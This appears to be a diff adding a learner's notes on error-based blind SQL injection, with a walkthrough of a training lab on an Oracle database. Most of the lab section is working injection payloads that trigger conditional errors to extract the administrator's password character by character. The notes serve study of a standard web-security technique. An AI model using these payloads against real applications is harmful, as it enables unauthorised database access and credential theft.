@@ -1,1 +1,65 @@
+# Hi ! , how are you.
+
+Today i'm totally eexcited to learn new thing today for the blind SQL.
+
+#Error-based SQL injection
+Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:
+
+The blind SQL injection technique where you don't get the query result directly, so we have to make the database to produce an error when our guess is correct
+
+1. The normal blind SQLi problem
+Select * From products where TrackingId='xyz'
+we inject 
+xyz' AND 1=1-- 
+xyz' AND 1=2--
+normally we can compare the application's responses:
+What if both responses look exactly the same.so ordinary blinkd SQLi and boolean-based blind SQLi doesn't help
+
+2. Idea : Turn TRUE into an error
+Need to do something that causes an error only when the condition is true
+example : CASE WHEN (1=2) THEN 1/0 ELSE 'a' END -> Normal response
+          CASE WHEN (1=1) THEN 1/0 ELSE 'a' END --> Causes Database error
+
+using this technique,we can retrieve data by testing on character at a time 
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+
+NOTE:
+There are different ways of triggering conditional errors, and different techiques work best on different database types. 
+-----------------------------------------------------------------------------------------------------------
+Lab: Blind SQL injection with conditional errors:
+This lab contains a blind SQL injection vlunerability.The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+END Goal:
+The database contains a different table called users, with columns called username and password . You need to exploit the blind SQL injection vluneraility to find out the password of the administrator user.
+
+To solve the lab , need to log in as the administrator user.
+
+Analysis:
+First verify is this vlunerable to blind SQL
+' || (select ' ' from dual ) || ' -> yes this is vlunerable to blind sql and this is oracle DB
+
+' || (select '' from users where rownum=1) || ' -> users table present in the database
+' || (select '' from users where username='administratora') || ' -> so application behaves same even if we don't have the user in the database
+
+'|| (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END from dual) ||'
+
+'|| (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator') ||'
+
+'|| (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator'and LENGTH(password)>2) ||'
+
+'|| (select CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator'and SUBSTR(Password, 1, 1) > 'm') ||'
+
+solved !!!
+The below is used to solve the Blind SQL injection with conditional responses
+' AND (select SUBSTRING(password,1,1) from users where username='administrator') < 'a' --
+
+---------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
 
